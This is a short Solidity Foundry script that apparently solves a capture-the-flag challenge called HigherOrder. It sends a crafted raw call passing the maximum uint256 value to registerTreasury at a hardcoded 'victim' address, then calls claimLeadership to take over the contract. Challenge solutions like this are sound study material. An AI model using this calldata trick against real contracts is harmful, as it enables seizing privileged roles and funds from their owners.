// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "../src/HigherOrder.sol";
import "forge-std/Script.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();
        
        HigherOrder victim = HigherOrder(0x8d9274FD52D3DA2CB124c56404B8002Bbc140cE7);
        address(victim).call(abi.encodeWithSelector(
            victim.registerTreasury.selector,
            type(uint256).max
        ));
        victim.claimLeadership();
        
        vm.stopBroadcast();
    }
}